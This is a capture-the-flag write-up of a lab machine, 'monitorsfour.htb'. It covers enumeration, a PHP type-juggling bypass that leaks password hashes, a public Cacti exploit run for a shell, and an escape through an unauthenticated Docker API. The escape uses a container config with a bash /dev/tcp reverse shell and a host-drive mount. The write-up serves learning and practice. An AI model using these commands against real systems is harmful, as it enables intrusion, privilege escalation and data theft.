### Nmap
```bash
nmap -sV -sC -vv 10.10.11.98

---OUTPUT---
Nmap scan report for 10.10.11.98
Host is up, received echo-reply ttl 127 (0.019s latency).
Scanned at 2025-12-07 11:04:07 EST for 15s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON          VERSION
80/tcp   open  http    syn-ack ttl 127 nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- Initial website is a simple website with a login 
- Using gobuster i find an unusual output for the user directory
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -url http://monitorsfour.htb -b 404
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://monitorsfour.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 367]
/login                (Status: 200) [Size: 4340]
/user                 (Status: 200) [Size: 35]
/static               (Status: 301) [Size: 162] [--> http://monitorsfour.htb/static/]
/views                (Status: 301) [Size: 162] [--> http://monitorsfour.htb/views/]
/forgot-password      (Status: 200) [Size: 3099]

```

![[Pasted image 20251207134736.png]]
![[Pasted image 20251207134751.png]]

- We also know php is running from wappalyzer:
![[Pasted image 20251207134825.png]]

- ffuf reveals a subdomain `cacti`
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://monitorsfour.htb/ -H 'Host: FUZZ.monitorsfour.htb' -fw 3    


---OUTPUT---
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.monitorsfour.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 22ms]
:: Progress: [100000/100000] :: Job [1/1] :: 1092 req/sec :: Duration: [0:01:21] :: Errors: 0 ::
```
![[Pasted image 20251207132310.png]]

- Going back to the user token we check for loose comparators and I tested `0e1234` from this website https://medium.com/@Q2hpY2tlblB3bnk/php-type-juggling-c34a10630b10
	- assuming that the code used loose comparator `==` instead of strict `===`
- 
![[Pasted image 20251207135218.png]]
- I get user hashes which i crack the admin one from crackstation.net to be `wonderful1`
![[Pasted image 20251207140127.png]]

- can login to `monitorsfour.htb`
![[Pasted image 20251207140245.png]]

- In cacti instead of admin we use his first name with the same password to login = `marcus:wonderful1`
![[Pasted image 20251207140644.png]]

- Looking online there is an exploit for version 1.2.28 
![[Pasted image 20251207141015.png]]

- I find an exploit on github : https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
- I execute the exploit and grab a shell:
```
python3 exploit.py -u marcus -p wonderful1 -i 10.10.14.21 -l 9999 -url http://cacti.monitorsfour.htb
```
![[Pasted image 20251207141331.png]]

- I seem to have privileges to go to marcus home directory and so grab the user flag:
![[Pasted image 20251207141518.png]]

- Checking uname I see its a linux machine making this possible a container.
![[Pasted image 20251207142945.png]]
- Checking resolv.conf to find nameserver
![[Pasted image 20251207143010.png]]
- checking default gateway with `ip route`
![[Pasted image 20251207143050.png]]
- Default gateway is `172.18.0.3`
- Also resolv.conf shows external server which is the docker host:
![[Pasted image 20251207143152.png]]
- Using fscan I can scan the host from the container:https://github.com/shadow1ng/fscan/releases
```
./fscan -h 192.168.65.7 -p 1-65535
```
![[Pasted image 20251207143456.png]]
- Port 2375 is open which is an unauthenticated docker daemon api (see PocScan for 2375)
	- this is a vulnerability : CVE-2025-9074
- by checking the port wiht curl we can grab the image name :
```
curl -s http://192.168.65.7:2375/images/json
```
![[Pasted image 20251207145626.png]]

- So i can basically send curl commadns to the API endpoint and pass commands. I will create a new container and execute my reverse shell command. furthermore it will mount the Administrator home directory to the system
- Create create_container.json :
```
{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": [
    "/bin/bash",
    "-c",
    "bash -i >& /dev/tcp/10.10.14.21/9999 0>&1" 
  ],
  "HostConfig": {
    "Binds": [
      "/mnt/host/c:/host_root"
    ]
  }
}
```
- Pass the curl command to create a container with this config above and store the output in response.json
```
curl -s -H "Content-Type: application/json" \
  -d @create_container.json \
  http://192.168.65.7:2375/containers/create \
  -o response.json
```
- I read `response.json` to get the contianer id:
```
cat response.json

---OUTPUT---
{"Id":"8dbc8345f58cca8a57ab19ad567fbf1e8979c0c9d767977761fcd226bebbbe14","Warnings":[]}
```
![[Pasted image 20251207154243.png]]
- I can then start the container with the following curl command and have my netcat listener listening:
```
curl -s -X POST http://192.168.65.7:2375/containers/8dbc8345f58cca8a57ab19ad567fbf1e8979c0c9d767977761fcd226bebbbe14/start
```
![[Pasted image 20251207154408.png]]
- We have now escaped that container to another container with the C drive mounted:
![[Pasted image 20251207154453.png]]
- I find root.txt in the mounted `host_root` directory at :`/host_root/Users/Administrator/Desktop`
![[Pasted image 20251207154613.png]]

